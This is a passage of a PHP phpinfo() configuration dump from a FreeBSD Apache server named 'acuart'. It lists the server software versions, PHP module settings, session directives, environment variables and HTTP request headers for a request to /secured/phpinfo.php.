<tr><td class="e">upload_max_filesize</td><td class="v">2M</td><td class="v">2M</td></tr>
<tr><td class="e">upload_tmp_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">user_dir</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">variables_order</td><td class="v">EGPCS</td><td class="v">EGPCS</td></tr>
<tr><td class="e">xmlrpc_error_number</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">xmlrpc_errors</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">y2k_compliance</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">zend.ze1_compatibility_mode</td><td class="v">Off</td><td class="v">Off</td></tr>

</table><br />
<h2><a name="module_apache2handler">apache2handler</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">Apache Version </td><td class="v">Apache/2.2.3 (FreeBSD) DAV/2 PHP/5.1.6 mod_ssl/2.2.3 OpenSSL/0.9.7e-p1 </td></tr>
<tr><td class="e">Apache API Version </td><td class="v">20051115 </td></tr>
<tr><td class="e">Server Administrator </td><td class="v">root@localhost.localdomain </td></tr>
<tr><td class="e">Hostname:Port </td><td class="v">acuart:0 </td></tr>
<tr><td class="e">User/Group </td><td class="v">www(80)/80 </td></tr>

<tr><td class="e">Max Requests </td><td class="v">Per Child: 10000 - Keep Alive: on - Max Per Connection: 100 </td></tr>
<tr><td class="e">Timeouts </td><td class="v">Connection: 300 - Keep-Alive: 5 </td></tr>
<tr><td class="e">Virtual Server </td><td class="v">Yes </td></tr>
<tr><td class="e">Server Root </td><td class="v">/usr/local </td></tr>
<tr><td class="e">Loaded Modules </td><td class="v">core prefork http_core mod_so mod_authn_file mod_authn_dbm mod_authn_anon mod_authn_default mod_authn_alias mod_authz_host mod_authz_groupfile mod_authz_user mod_authz_dbm mod_authz_owner mod_authz_default mod_auth_basic mod_auth_digest mod_file_cache mod_cache mod_disk_cache mod_include mod_filter mod_charset_lite mod_deflate mod_log_config mod_logio mod_env mod_mime_magic mod_cern_meta mod_expires mod_headers mod_usertrack mod_setenvif mod_version mod_ssl mod_mime mod_dav mod_status mod_autoindex mod_asis mod_info mod_cgi mod_dav_fs mod_vhost_alias mod_negotiation mod_dir mod_imagemap mod_actions mod_speling mod_userdir mod_alias mod_rewrite mod_php5 </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">

<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">engine</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">last_modified</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">xbithack</td><td class="v">0</td><td class="v">0</td></tr>
</table><br />

<h2>Apache Environment</h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Variable</th><th>Value</th></tr>
<tr><td class="e">HTTP_HOST </td><td class="v">acuart </td></tr>
<tr><td class="e">HTTP_USER_AGENT </td><td class="v">Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11 </td></tr>
<tr><td class="e">HTTP_ACCEPT </td><td class="v">text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 </td></tr>
<tr><td class="e">HTTP_ACCEPT_LANGUAGE </td><td class="v">en-us,en;q=0.5 </td></tr>

<tr><td class="e">HTTP_ACCEPT_ENCODING </td><td class="v">gzip,deflate </td></tr>
<tr><td class="e">HTTP_ACCEPT_CHARSET </td><td class="v">ISO-8859-1,utf-8;q=0.7,*;q=0.7 </td></tr>
<tr><td class="e">HTTP_KEEP_ALIVE </td><td class="v">300 </td></tr>
<tr><td class="e">HTTP_CONNECTION </td><td class="v">keep-alive </td></tr>
<tr><td class="e">PATH </td><td class="v">/sbin:/bin:/usr/sbin:/usr/bin </td></tr>
<tr><td class="e">SERVER_SIGNATURE </td><td class="v"><i>no value</i> </td></tr>

<tr><td class="e">SERVER_SOFTWARE </td><td class="v">Apache/2.2.3 (FreeBSD) DAV/2 PHP/5.1.6 mod_ssl/2.2.3 OpenSSL/0.9.7e-p1 </td></tr>
<tr><td class="e">SERVER_NAME </td><td class="v">acuart </td></tr>
<tr><td class="e">SERVER_ADDR </td><td class="v">192.168.0.5 </td></tr>
<tr><td class="e">SERVER_PORT </td><td class="v">80 </td></tr>
<tr><td class="e">REMOTE_ADDR </td><td class="v">192.168.0.26 </td></tr>
<tr><td class="e">DOCUMENT_ROOT </td><td class="v">/var/www/acuart/ </td></tr>

<tr><td class="e">SERVER_ADMIN </td><td class="v">root@localhost.localdomain </td></tr>
<tr><td class="e">SCRIPT_FILENAME </td><td class="v">/var/www/acuart/secured/phpinfo.php </td></tr>
<tr><td class="e">REMOTE_PORT </td><td class="v">11493 </td></tr>
<tr><td class="e">GATEWAY_INTERFACE </td><td class="v">CGI/1.1 </td></tr>
<tr><td class="e">SERVER_PROTOCOL </td><td class="v">HTTP/1.1 </td></tr>
<tr><td class="e">REQUEST_METHOD </td><td class="v">GET </td></tr>

<tr><td class="e">QUERY_STRING </td><td class="v"><i>no value</i> </td></tr>
<tr><td class="e">REQUEST_URI </td><td class="v">/secured/phpinfo.php </td></tr>
<tr><td class="e">SCRIPT_NAME </td><td class="v">/secured/phpinfo.php </td></tr>
</table><br />
<h2>HTTP Headers Information</h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th colspan="2">HTTP Request Headers</th></tr>
<tr><td class="e">HTTP Request </td><td class="v">GET /secured/phpinfo.php HTTP/1.1 </td></tr>

<tr><td class="e">Host </td><td class="v">acuart </td></tr>
<tr><td class="e">User-Agent </td><td class="v">Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11 </td></tr>
<tr><td class="e">Accept </td><td class="v">text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5 </td></tr>
<tr><td class="e">Accept-Language </td><td class="v">en-us,en;q=0.5 </td></tr>
<tr><td class="e">Accept-Encoding </td><td class="v">gzip,deflate </td></tr>
<tr><td class="e">Accept-Charset </td><td class="v">ISO-8859-1,utf-8;q=0.7,*;q=0.7 </td></tr>

<tr><td class="e">Keep-Alive </td><td class="v">300 </td></tr>
<tr><td class="e">Connection </td><td class="v">keep-alive </td></tr>
<tr class="h"><th colspan="2">HTTP Response Headers</th></tr>
<tr><td class="e">X-Powered-By </td><td class="v">PHP/5.1.6 </td></tr>
<tr><td class="e">Keep-Alive </td><td class="v">timeout=5, max=100 </td></tr>
<tr><td class="e">Connection </td><td class="v">Keep-Alive </td></tr>

<tr><td class="e">Transfer-Encoding </td><td class="v">chunked </td></tr>
<tr><td class="e">Content-Type </td><td class="v">text/html </td></tr>
</table><br />
<h2><a name="module_ctype">ctype</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">ctype functions </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_curl">curl</a></h2>
<table border="0" cellpadding="3" width="600">

<tr><td class="e">CURL support </td><td class="v">enabled </td></tr>
<tr><td class="e">CURL Information </td><td class="v">libcurl/7.15.5 OpenSSL/0.9.7e zlib/1.2.3 </td></tr>
</table><br />
<h2><a name="module_date">date</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">date/time support </td><td class="v">enabled </td></tr>
<tr><td class="e">Timezone Database Version </td><td class="v">2006.1 </td></tr>
<tr><td class="e">Timezone Database </td><td class="v">internal </td></tr>

<tr><td class="e">Default timezone </td><td class="v">Europe/Helsinki </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">date.default_latitude</td><td class="v">31.7667</td><td class="v">31.7667</td></tr>
<tr><td class="e">date.default_longitude</td><td class="v">35.2333</td><td class="v">35.2333</td></tr>

<tr><td class="e">date.sunrise_zenith</td><td class="v">90.583333</td><td class="v">90.583333</td></tr>
<tr><td class="e">date.sunset_zenith</td><td class="v">90.583333</td><td class="v">90.583333</td></tr>
<tr><td class="e">date.timezone</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table><br />
<h2><a name="module_dom">dom</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">DOM/XML </td><td class="v">enabled </td></tr>

<tr><td class="e">DOM/XML API Version </td><td class="v">20031129 </td></tr>
<tr><td class="e">libxml Version </td><td class="v">2.6.26 </td></tr>
<tr><td class="e">HTML Support </td><td class="v">enabled </td></tr>
<tr><td class="e">XPath Support </td><td class="v">enabled </td></tr>
<tr><td class="e">XPointer Support </td><td class="v">enabled </td></tr>
<tr><td class="e">Schema Support </td><td class="v">enabled </td></tr>

<tr><td class="e">RelaxNG Support </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_exif">exif</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">EXIF Support </td><td class="v">enabled </td></tr>
<tr><td class="e">EXIF Version </td><td class="v">1.4 $Id: exif.c,v 1.173.2.5 2006/04/10 18:23:24 helly Exp $ </td></tr>
<tr><td class="e">Supported EXIF Version </td><td class="v">0220 </td></tr>
<tr><td class="e">Supported filetypes </td><td class="v">JPEG,TIFF </td></tr>

</table><br />
<h2><a name="module_ftp">ftp</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">FTP support </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_gd">gd</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">GD Support </td><td class="v">enabled </td></tr>
<tr><td class="e">GD Version </td><td class="v">bundled (2.0.28 compatible) </td></tr>

<tr><td class="e">FreeType Support </td><td class="v">enabled </td></tr>
<tr><td class="e">FreeType Linkage </td><td class="v">with freetype </td></tr>
<tr><td class="e">FreeType Version </td><td class="v">2.2.1 </td></tr>
<tr><td class="e">T1Lib Support </td><td class="v">enabled </td></tr>
<tr><td class="e">GIF Read Support </td><td class="v">enabled </td></tr>
<tr><td class="e">GIF Create Support </td><td class="v">enabled </td></tr>

<tr><td class="e">JPG Support </td><td class="v">enabled </td></tr>
<tr><td class="e">PNG Support </td><td class="v">enabled </td></tr>
<tr><td class="e">WBMP Support </td><td class="v">enabled </td></tr>
<tr><td class="e">XPM Support </td><td class="v">enabled </td></tr>
<tr><td class="e">XBM Support </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_gettext">gettext</a></h2>

<table border="0" cellpadding="3" width="600">
<tr><td class="e">GetText Support </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_iconv">iconv</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">iconv support </td><td class="v">enabled </td></tr>
<tr><td class="e">iconv implementation </td><td class="v">libiconv </td></tr>
<tr><td class="e">iconv library version </td><td class="v">1.9 </td></tr>

</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">iconv.input_encoding</td><td class="v">ISO-8859-1</td><td class="v">ISO-8859-1</td></tr>
<tr><td class="e">iconv.internal_encoding</td><td class="v">ISO-8859-1</td><td class="v">ISO-8859-1</td></tr>
<tr><td class="e">iconv.output_encoding</td><td class="v">ISO-8859-1</td><td class="v">ISO-8859-1</td></tr>

</table><br />
<h2><a name="module_libxml">libxml</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">libXML support </td><td class="v">active </td></tr>
<tr><td class="e">libXML Version </td><td class="v">2.6.26 </td></tr>
<tr><td class="e">libXML streams </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_mssql">mssql</a></h2>
<table border="0" cellpadding="3" width="600">

<tr class="h"><th>MSSQL Support</th><th>enabled</th></tr>
<tr><td class="e">Active Persistent Links </td><td class="v">0 </td></tr>
<tr><td class="e">Active Links </td><td class="v">0 </td></tr>
<tr><td class="e">Library version </td><td class="v">FreeTDS </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>

<tr><td class="e">mssql.allow_persistent</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">mssql.batchsize</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">mssql.charset</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mssql.compatability_mode</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">mssql.connect_timeout</td><td class="v">5</td><td class="v">5</td></tr>

<tr><td class="e">mssql.datetimeconvert</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">mssql.max_links</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mssql.max_persistent</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mssql.max_procs</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mssql.min_error_severity</td><td class="v">10</td><td class="v">10</td></tr>

<tr><td class="e">mssql.min_message_severity</td><td class="v">10</td><td class="v">10</td></tr>
<tr><td class="e">mssql.secure_connection</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">mssql.textlimit</td><td class="v">Server default</td><td class="v">Server default</td></tr>
<tr><td class="e">mssql.textsize</td><td class="v">Server default</td><td class="v">Server default</td></tr>
<tr><td class="e">mssql.timeout</td><td class="v">60</td><td class="v">60</td></tr>

</table><br />
<h2><a name="module_mysql">mysql</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>MySQL Support</th><th>enabled</th></tr>
<tr><td class="e">Active Persistent Links </td><td class="v">0 </td></tr>
<tr><td class="e">Active Links </td><td class="v">0 </td></tr>
<tr><td class="e">Client API version </td><td class="v">5.1.11-beta </td></tr>
<tr><td class="e">MYSQL_MODULE_TYPE </td><td class="v"><i>no value</i> </td></tr>

<tr><td class="e">MYSQL_SOCKET </td><td class="v">/tmp/mysql.sock </td></tr>
<tr><td class="e">MYSQL_INCLUDE </td><td class="v"><i>no value</i> </td></tr>
<tr><td class="e">MYSQL_LIBS </td><td class="v"><i>no value</i> </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>

<tr><td class="e">mysql.allow_persistent</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">mysql.connect_timeout</td><td class="v">60</td><td class="v">60</td></tr>
<tr><td class="e">mysql.default_host</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysql.default_password</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysql.default_port</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">mysql.default_socket</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysql.default_user</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysql.max_links</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mysql.max_persistent</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mysql.trace_mode</td><td class="v">Off</td><td class="v">Off</td></tr>

</table><br />
<h2><a name="module_mysqli">mysqli</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>MysqlI Support</th><th>enabled</th></tr>
<tr><td class="e">Client API library version </td><td class="v">5.1.11-beta </td></tr>
<tr><td class="e">Client API header version </td><td class="v">5.1.11-beta </td></tr>
<tr><td class="e">MYSQLI_SOCKET </td><td class="v">/tmp/mysql.sock </td></tr>
</table><br />

<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">mysqli.default_host</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysqli.default_port</td><td class="v">3306</td><td class="v">3306</td></tr>
<tr><td class="e">mysqli.default_pw</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>

<tr><td class="e">mysqli.default_socket</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysqli.default_user</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">mysqli.max_links</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">mysqli.reconnect</td><td class="v">Off</td><td class="v">Off</td></tr>
</table><br />

<h2><a name="module_openssl">openssl</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">OpenSSL support </td><td class="v">enabled </td></tr>
<tr><td class="e">OpenSSL Version </td><td class="v">OpenSSL 0.9.7e-p1 25 Oct 2004 </td></tr>
</table><br />
<h2><a name="module_pcre">pcre</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">PCRE (Perl Compatible Regular Expressions) Support </td><td class="v">enabled </td></tr>
<tr><td class="e">PCRE Library Version </td><td class="v">6.6 06-Feb-2006 </td></tr>

</table><br />
<h2><a name="module_PDO">PDO</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>PDO support</th><th>enabled</th></tr>
<tr><td class="e">PDO drivers </td><td class="v"><i>no value</i> </td></tr>
</table><br />
<h2><a name="module_pgsql">pgsql</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>PostgreSQL Support</th><th>enabled</th></tr>

<tr><td class="e">PostgreSQL(libpq) Version </td><td class="v">7.4.13 </td></tr>
<tr><td class="e">Multibyte character support </td><td class="v">enabled </td></tr>
<tr><td class="e">SSL support </td><td class="v">enabled </td></tr>
<tr><td class="e">Active Persistent Links </td><td class="v">0 </td></tr>
<tr><td class="e">Active Links </td><td class="v">0 </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">

<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">pgsql.allow_persistent</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">pgsql.auto_reset_persistent</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">pgsql.ignore_notice</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">pgsql.log_notice</td><td class="v">Off</td><td class="v">Off</td></tr>

<tr><td class="e">pgsql.max_links</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
<tr><td class="e">pgsql.max_persistent</td><td class="v">Unlimited</td><td class="v">Unlimited</td></tr>
</table><br />
<h2><a name="module_posix">posix</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">Revision </td><td class="v">$Revision: 1.70.2.3 $ </td></tr>
</table><br />
<h2><a name="module_Reflection">Reflection</a></h2>

<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Reflection</th><th>enabled</th></tr>
<tr><td class="e">Version </td><td class="v">$Id: php_reflection.c,v 1.164.2.33 2006/03/29 14:28:42 tony2001 Exp $ </td></tr>
</table><br />
<h2><a name="module_session">session</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">Session Support </td><td class="v">enabled </td></tr>
<tr><td class="e">Registered save handlers </td><td class="v">files user  </td></tr>

<tr><td class="e">Registered serializer handlers </td><td class="v">php php_binary  </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">session.auto_start</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">session.bug_compat_42</td><td class="v">On</td><td class="v">On</td></tr>

<tr><td class="e">session.bug_compat_warn</td><td class="v">On</td><td class="v">On</td></tr>
<tr><td class="e">session.cache_expire</td><td class="v">180</td><td class="v">180</td></tr>
<tr><td class="e">session.cache_limiter</td><td class="v">nocache</td><td class="v">nocache</td></tr>
<tr><td class="e">session.cookie_domain</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.cookie_lifetime</td><td class="v">0</td><td class="v">0</td></tr>

<tr><td class="e">session.cookie_path</td><td class="v">/</td><td class="v">/</td></tr>
<tr><td class="e">session.cookie_secure</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">session.entropy_file</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.entropy_length</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">session.gc_divisor</td><td class="v">100</td><td class="v">100</td></tr>

<tr><td class="e">session.gc_maxlifetime</td><td class="v">1440</td><td class="v">1440</td></tr>
<tr><td class="e">session.gc_probability</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">session.hash_bits_per_character</td><td class="v">4</td><td class="v">4</td></tr>
<tr><td class="e">session.hash_function</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">session.name</td><td class="v">PHPSESSID</td><td class="v">PHPSESSID</td></tr>

<tr><td class="e">session.referer_check</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.save_handler</td><td class="v">files</td><td class="v">files</td></tr>
<tr><td class="e">session.save_path</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">session.serialize_handler</td><td class="v">php</td><td class="v">php</td></tr>
<tr><td class="e">session.use_cookies</td><td class="v">On</td><td class="v">On</td></tr>

<tr><td class="e">session.use_only_cookies</td><td class="v">Off</td><td class="v">Off</td></tr>
<tr><td class="e">session.use_trans_sid</td><td class="v">0</td><td class="v">0</td></tr>
</table><br />
<h2><a name="module_SimpleXML">SimpleXML</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Simplexml support</th><th>enabled</th></tr>
<tr><td class="e">Revision </td><td class="v">$Revision: 1.151.2.22 $ </td></tr>

<tr><td class="e">Schema support </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_SPL">SPL</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>SPL support</th><th>enabled</th></tr>
<tr><td class="e">Interfaces </td><td class="v">Countable, OuterIterator, RecursiveIterator, SeekableIterator, SplObserver, SplSubject </td></tr>
<tr><td class="e">Classes </td><td class="v">AppendIterator, ArrayIterator, ArrayObject, BadFunctionCallException, BadMethodCallException, CachingIterator, DirectoryIterator, DomainException, EmptyIterator, FilterIterator, InfiniteIterator, InvalidArgumentException, IteratorIterator, LengthException, LimitIterator, LogicException, NoRewindIterator, OutOfBoundsException, OutOfRangeException, OverflowException, ParentIterator, RangeException, RecursiveArrayIterator, RecursiveCachingIterator, RecursiveDirectoryIterator, RecursiveFilterIterator, RecursiveIteratorIterator, RuntimeException, SplFileInfo, SplFileObject, SplObjectStorage, SplTempFileObject, UnderflowException, UnexpectedValueException </td></tr>
</table><br />

<h2><a name="module_SQLite">SQLite</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>SQLite support</th><th>enabled</th></tr>
<tr><td class="e">PECL Module version </td><td class="v">2.0-dev $Id: sqlite.c,v 1.166.2.13 2006/04/18 14:30:15 iliaa Exp $ </td></tr>
<tr><td class="e">SQLite Library </td><td class="v">2.8.17 </td></tr>
<tr><td class="e">SQLite Encoding </td><td class="v">iso8859 </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">

<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">sqlite.assoc_case</td><td class="v">0</td><td class="v">0</td></tr>
</table><br />
<h2><a name="module_standard">standard</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">Regex Library </td><td class="v">Bundled library enabled </td></tr>
<tr><td class="e">Dynamic Library Support </td><td class="v">enabled </td></tr>

<tr><td class="e">Path to sendmail </td><td class="v">/usr/sbin/sendmail -t -i  </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">assert.active</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">assert.bail</td><td class="v">0</td><td class="v">0</td></tr>

<tr><td class="e">assert.callback</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">assert.quiet_eval</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">assert.warning</td><td class="v">1</td><td class="v">1</td></tr>
<tr><td class="e">auto_detect_line_endings</td><td class="v">0</td><td class="v">0</td></tr>
<tr><td class="e">default_socket_timeout</td><td class="v">60</td><td class="v">60</td></tr>

<tr><td class="e">safe_mode_allowed_env_vars</td><td class="v">PHP_</td><td class="v">PHP_</td></tr>
<tr><td class="e">safe_mode_protected_env_vars</td><td class="v">LD_LIBRARY_PATH</td><td class="v">LD_LIBRARY_PATH</td></tr>
<tr><td class="e">url_rewriter.tags</td><td class="v">a=href,area=href,frame=src,input=src,form=,fieldset=</td><td class="v">a=href,area=href,frame=src,input=src,form=,fieldset=</td></tr>
<tr><td class="e">user_agent</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table><br />

<h2><a name="module_tidy">tidy</a></h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Tidy support</th><th>enabled</th></tr>
<tr><td class="e">libTidy Release </td><td class="v">1 September 2005 </td></tr>
<tr><td class="e">Extension Version </td><td class="v">2.0 ($Id: tidy.c,v 1.66.2.8 2006/04/19 21:47:20 nlopess Exp $) </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>

<tr><td class="e">tidy.clean_output</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
<tr><td class="e">tidy.default_config</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table><br />
<h2><a name="module_tokenizer">tokenizer</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">Tokenizer Support </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_xml">xml</a></h2>

<table border="0" cellpadding="3" width="600">
<tr><td class="e">XML Support </td><td class="v">active </td></tr>
<tr><td class="e">XML Namespace Support </td><td class="v">active </td></tr>
<tr><td class="e">libxml2 Version </td><td class="v">2.6.26 </td></tr>
</table><br />
<h2><a name="module_xmlreader">xmlreader</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">XMLReader </td><td class="v">enabled </td></tr>

</table><br />
<h2><a name="module_xmlwriter">xmlwriter</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">XMLWriter </td><td class="v">enabled </td></tr>
</table><br />
<h2><a name="module_xsl">xsl</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">XSL </td><td class="v">enabled </td></tr>
<tr><td class="e">libxslt Version </td><td class="v">1.1.17 </td></tr>

<tr><td class="e">libxslt compiled against libxml Version </td><td class="v">2.6.26 </td></tr>
<tr><td class="e">EXSLT </td><td class="v">enabled </td></tr>
<tr><td class="e">libexslt Version </td><td class="v">1.1.17 </td></tr>
</table><br />
<h2><a name="module_zlib">zlib</a></h2>
<table border="0" cellpadding="3" width="600">
<tr><td class="e">ZLib Support </td><td class="v">enabled </td></tr>
<tr><td class="e">Stream Wrapper support </td><td class="v">compress.zlib:// </td></tr>

<tr><td class="e">Stream Filter support </td><td class="v">zlib.inflate, zlib.deflate </td></tr>
<tr><td class="e">Compiled Version </td><td class="v">1.2.3 </td></tr>
<tr><td class="e">Linked Version </td><td class="v">1.2.3 </td></tr>
</table><br />
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Directive</th><th>Local Value</th><th>Master Value</th></tr>
<tr><td class="e">zlib.output_compression</td><td class="v">Off</td><td class="v">Off</td></tr>

<tr><td class="e">zlib.output_compression_level</td><td class="v">-1</td><td class="v">-1</td></tr>
<tr><td class="e">zlib.output_handler</td><td class="v"><i>no value</i></td><td class="v"><i>no value</i></td></tr>
</table><br />
<h2>Additional Modules</h2>
<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Module Name</th></tr>
</table><br />
<h2>Environment</h2>

<table border="0" cellpadding="3" width="600">
<tr class="h"><th>Variable</th><th>Value</th></tr>
<tr><td class="e">LD_LIBRARY_PATH </td><td class="v">/usr/local/lib: </td></tr>
<tr><td class="e">HOME </td><td class="v">/ </td></tr>
<tr><td class="e">PATH </td><td class="v">/sbin:/bin:/usr/sbin:/usr/bin </td></tr>
</table><br />
<h2>PHP Variables</h2>
<table border="0" cellpadding="3" width="600">

<tr class="h"><th>Variable</th><th>Value</th></tr>
<tr><td class="e">_SERVER["HTTP_HOST"]</td><td class="v">acuart</td></tr>
<tr><td class="e">_SERVER["HTTP_USER_AGENT"]</td><td class="v">Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.11) Gecko/20071127 Firefox/2.0.0.11</td></tr>
<tr><td class="e">_SERVER["HTTP_ACCEPT"]</td><td class="v">text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5</td></tr>
<tr><td class="e">_SERVER["HTTP_ACCEPT_LANGUAGE"]</td><td class="v">en-us,en;q=0.5</td></tr>
<tr><td class="e">_SERVER["HTTP_ACCEPT_ENCODING"]</td><td class="v">gzip,deflate</td></tr>

<tr><td class="e">_SERVER["HTTP_ACCEPT_CHARSET"]</td><td class="v">ISO-8859-1,utf-8;q=0.7,*;q=0.7</td></tr>
<tr><td class="e">_SERVER["HTTP_KEEP_ALIVE"]</td><td class="v">300</td></tr>
<tr><td class="e">_SERVER["HTTP_CONNECTION"]</td><td class="v">keep-alive</td></tr>
<tr><td class="e">_SERVER["PATH"]</td><td class="v">/sbin:/bin:/usr/sbin:/usr/bin</td></tr>
